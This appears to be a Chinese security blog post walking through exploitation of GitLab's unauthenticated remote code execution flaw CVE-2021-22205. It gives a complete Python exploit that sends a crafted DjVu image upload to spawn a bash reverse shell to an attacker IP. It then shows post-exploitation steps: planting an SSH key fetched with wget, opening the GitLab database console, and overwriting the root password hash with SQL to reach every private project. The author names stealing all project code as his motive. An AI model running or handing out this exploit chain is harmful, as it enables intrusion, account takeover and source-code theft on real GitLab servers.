# gitlab未授权RCE（CVE-2021-22205）漏洞复现及深入利用

阅读量 **514521**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-29 16:30:08

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t012ff5aaa4a70057e9.jpg)

## 影响版本

11.9 <= Gitlab CE/EE < 13.8.8  
13.9 <= Gitlab CE/EE < 13.9.6  
13.10 <= Gitlab CE/EE < 13.10.3

## gitlab漏洞环境

使用vulhub的docker环境，但是总是崩掉  
尝试自己安装。参考<https://www.yuque.com/h3110n3w0r1d/htbocl/pcbcda>

## 利用方式

通过CVE-2021-22205进行反弹shell  
利用脚本：

    
    
    #!/usr/bin/env python
    # -*- coding:utf-8 -*-    import requests
    from bs4 import BeautifulSoup
    
    class Exploit():
        __info__ = {
            'name': 'CVE-2021-22205',
            'desription': 'gitlab 未授权远程命令执行',
            'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205'],
            'devices': ['gitlab',
                        '11.9=< version <13.8.8',
                        '13.9=< version <13.9.6',
                        '13.10=< version <13.10.3'
            ],
        }
    
        target = "192.168.236.130"
        port = 8888
        reverseShell = "echo '/bin/bash -i >& /dev/tcp/{}/{} 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh"
    
        def exploit(self):
            session = requests.Session()
            requests.packages.urllib3.disable_warnings()
            url = "http://{}:{}".format(self.target, self.port)
            try:
                r = session.get(url.strip("/") + "/users/sign_in", verify=False)
                soup = BeautifulSoup(r.text, features="lxml")
                token = soup.findAll('meta')[16].get("content")
                data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + self.reverseShell + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                    "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
                flag = 'Failed to process image'
                req = session.post(url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)
                x = req.text
                if flag in x:
                    return "success!!!"
                else:
                    print("[-] Vuln Check Failed... ...")
                    return 'failed'
            except Exception as error:
                print(error.with_traceback())
                print("[-] Vuln Check Failed... ...")
                return 'failed'
    
        def run(self):
            res = self.exploit()
            return res
    
    if __name__ == '__main__':
        exploit = Exploit()
        '''
        在GitLab CE/EE中发现一个问题，从11.9开始影响所有版本。
        GitLab没有正确地验证传递给文件解析器的图像文件，导致远程命令执行
        此脚本利用此漏洞进行反弹shell, 测试前请配置好下面的 listenIp 和 listenPort 参数
        '''
        exploit.target= "192.168.2.83"
        exploit.port = 10000
        listenIp = "192.168.2.97"
        listenPort = "9999"
        exploit.reverseShell = exploit.reverseShell.format(listenIp,listenPort)
        result = exploit.run()
        print(result)
    

在攻击机器192.168.2.97上监听9999端口

![](https://p2.ssl.qhimg.com/t01e6b0e9f0215b1807.png)

设置漏洞利用脚本的target(192.168.2.83)和port(10000)值

![](https://p0.ssl.qhimg.com/t01f23dd7c205e80190.png)

python3运行脚本，成功反弹shell

![](https://p5.ssl.qhimg.com/t01a3db95e8c7b9e232.png)

在linux下，web目录仅仅只有root用户具有写权限。获取的git用户无写权限。  
发现git用户具有操作数据库权限，而gitlab自带了访问数据库的命令：gitlab-rails dbconsole  
在反弹的shell处，敲入gitlab-rails dbconsole 无法成功访问，一直卡着，如下图：

![](https://p4.ssl.qhimg.com/t01d587eb51b88d81c3.png)

查看/etc/passwd

![](https://p4.ssl.qhimg.com/t01e34276bc3a2b79b1.png)

gti用户具有ssh登录权限，向git用户用户写入公钥进行登录，写入公钥的命令方式又很多种，这里使用wget命令  
先将生成的公钥放在远程服务器下，在反弹shell处将公钥下载到受害者机器上  
`wget http://192.168.2.62:8001/gitlab_git.pub`

![](https://p1.ssl.qhimg.com/t01217ec48ef467cbdb.png)

![](https://p2.ssl.qhimg.com/t014cff793c34c24b37.png)

默认情况下git用户的authorized_keys内容为空，如果存在内容的话，先备份一下，再写入。  
写入成功后进行ssh登录即可。登录后如下

![](https://p5.ssl.qhimg.com/t0199c5d4bba417e889.png)

再次执行`gitlab-rails dbconsole` 命令  
成功获取数据库权限

![](https://p1.ssl.qhimg.com/t01a8dc134076274dfc.png)

查看有哪些数据表

![](https://p4.ssl.qhimg.com/t0161edd25528be66ec.png)

![](https://p4.ssl.qhimg.com/t01b389de7bbdc42229.png)

发现users表，格式化输出root用户的信息，ps: root的id为1

![](https://p5.ssl.qhimg.com/t01389290bf5dbdbae4.png)

根据密码特征，可以发现是bcrypt加密，这种加密针对同一种明文每次加密后的密文不一样。也就是说不可逆，但运气好的话，可在cmd5中解开，但又因为gitlab默认的密码策略是8个字符。  
最委托的办法就是修改root用户的密码密文值。关于bcrypt加密算法参考<https://blog.csdn.net/fengyingkong/article/details/87377061>  
12345678的密文值为`$2a$10$9sM0WeC3WSDCx9HWwr7z7eV3h3Q/tPxP7G2kvCWxWqdJemid1lICa`  
执行如下sql命令：  
`update users set
encrypted_password='$2a$10$9sM0WeC3WSDCx9HWwr7z7eV3h3Q/tPxP7G2kvCWxWqdJemid1lICa'
where e id =1;`

![](https://p3.ssl.qhimg.com/t0197183445921b3a34.png)

注意：在实战情况下，修改root密码密文前，先备份一下，事后恢复。

修改成功后，使用root/12345678登录

![](https://p5.ssl.qhimg.com/t0143f71952a56f91ce.png)

访问<http://192.168.2.83:10000/admin>

![](https://p2.ssl.qhimg.com/t0136b17013e9a28ff5.png)

可以看到即使private项目也可以访问

![](https://p0.ssl.qhimg.com/t01354d7b8f247f511b.png)

![](https://p4.ssl.qhimg.com/t01a596e25c06435240.png)

可获取gitlab所有的项目代码。  
ps：获取gitlab系统所有项目代码是我最大动力…… 另外上述操作均在gitlab默认配置情况下，若漏洞利用无法复现可留言，一起讨论研究。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **喜欢和开发玩** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/259862](/post/id/259862)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [RCE](/tag/RCE)
  * [GitLab](/tag/GitLab)
  * [CVE-2021-22205](/tag/CVE-2021-22205)

 **+1** __5赞

 __收藏

![](https://thirdqq.qlogo.cn/qqapp/101431079/E22D725E718FBECCF31B8F5371898883/40)
喜欢和开发玩

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

